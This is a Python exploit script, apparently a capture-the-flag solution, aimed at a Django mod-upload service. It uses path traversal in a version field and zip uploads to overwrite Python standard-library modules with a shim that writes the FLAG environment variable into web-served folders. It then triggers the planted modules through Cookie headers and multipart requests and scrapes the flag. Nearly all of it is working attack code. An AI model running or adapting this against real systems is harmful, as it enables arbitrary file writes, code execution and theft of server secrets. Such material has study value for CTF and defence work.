#!/usr/bin/env python3
"""
_t41_http_all.py - Comprehensive test:
1. Fresh user per test
2. Overwrite http/cookies.py, http/cookiejar.py, email/policy.py
3. Multiple trigger methods
"""
import requests, sys, io, zipfile, secrets, time, random

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh_user():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_platform(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    items = r.get("results", r) if isinstance(r, dict) else r
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    return requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15).json()["id"]

def plant(tok, pkg_dir, filename, payload):
    """Write payload to /usr/local/lib/python3.11/<pkg_dir>/<filename>"""
    code = f"lib/python3.11/{pkg_dir}"  # <= 20 chars
    assert len(code) <= 20, f"code too long: {len(code)} chars: {code}"
    
    pid = get_or_create_platform(tok, code)
    ver = "../../../usr/local"
    mid = requests.post(f"{BASE}/api/mods/", headers=H(tok),
        json={"title":"z","mod_version":ver,"release_notes":"","is_enabled":True}, timeout=15).json()["id"]
    bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
        json={"platform": pid}, timeout=15).json()["id"]
    
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, payload if isinstance(payload, bytes) else payload.encode())
    bio.seek(0)
    r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
        files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
    return r.status_code

def make_shim(out):
    return (
        "import os as _os\n"
        "try:\n"
        f"    open('/usr/share/nginx/html/{out}','w').write(_os.environ.get('FLAG','NOFLAG')+'\\n')\n"
        "except Exception: pass\n"
        "try:\n"
        f"    open('/data/media/{out}','w').write(_os.environ.get('FLAG','NOFLAG')+'\\n')\n"
        "except Exception: pass\n"
    )

print(f"[*] Target: {BASE}")

# ---- PLAN ----
# Module         | Trigger method
# http.cookies   | Cookie request header parsed by Django
# http.cookiejar | Used by requests internally (client-side, so unlikely server-side)
# email.policy   | Multipart form parsing (Django parses multipart with email)

targets = [
    # (pkg_dir, filename, module_name, trigger_description)
    ("http", "cookies.py", "http.cookies", "Django parses Cookie header"),
    ("email", "policy.py", "email.policy", "Django multipart form parsing"),
    ("email", "_header_value_parser.py", "email._header_value_parser", "Header parsing"),
    ("json", "tool.py", "json.tool", "May not trigger automatically"),
]

# Plant all payloads
outs = {}
for pkg_dir, filename, modname, desc in targets:
    tok, u = fresh_user()
    out = modname.replace(".", "_") + "_" + secrets.token_hex(2) + ".txt"
    outs[modname] = out
    status = plant(tok, pkg_dir, filename, make_shim(out))
    print(f"[*] Plant {modname} ({pkg_dir}/{filename}) -> {status}")

print()
print("[*] Triggering imports...")

# Trigger 1: Cookie header (for http.cookies)
tok2, _ = fresh_user()
for path in ["/api/mods/", "/api/platforms/", "/api/schema/"]:
    r = requests.get(f"{BASE}{path}", headers={**H(tok2), "Cookie": "a=b; c=d"}, timeout=15)
    print(f"  GET {path} +Cookie -> {r.status_code}")

# Trigger 2: Multipart upload (for email.policy - Django uses email.feedparser for multipart)
tok3, u3 = fresh_user()
# Register generates a multipart? No... but uploading does!
# The upload view uses MultiPartParser which uses email internally
pid3 = requests.post(f"{BASE}/api/platforms/", headers=H(tok3),
    json={"code":"pc3x","name":"z"}, timeout=15).json()["id"]
mid3 = requests.post(f"{BASE}/api/mods/", headers=H(tok3),
    json={"title":"z","mod_version":"v3x","release_notes":"","is_enabled":True}, timeout=15).json()["id"]
bid3 = requests.post(f"{BASE}/api/mods/{mid3}/builds/", headers=H(tok3),
    json={"platform": pid3}, timeout=15).json()["id"]
bio3 = io.BytesIO()
with zipfile.ZipFile(bio3, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("a.txt", b"trigger")
bio3.seek(0)
r3 = requests.post(f"{BASE}/api/mods/{mid3}/builds/{bid3}/upload/", headers=H(tok3),
    files={"zip_file": ("t.zip", bio3, "application/zip")}, timeout=30)
print(f"  multipart upload (email trigger) -> {r3.status_code}")

time.sleep(1)

# Check results
print()
print("[*] Checking outputs...")
import re
flag_found = None
for modname, out in outs.items():
    for url, label in [(f"{BASE}/{out}", "nginx"), (f"{BASE}/media/{out}", "media")]:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            m = re.search(r"PTITCTF\{[^}]+\}", r.text)
            print(f"  [{modname}] {label}: {r.text[:100]}")
            if m:
                print(f"\n>>> FLAG: {m.group(0)}")
                flag_found = m.group(0)
            break
    else:
        print(f"  [{modname}] not triggered")

if not flag_found:
    print("\n[-] No flag found. Modules may already be cached, or triggers incorrect.")
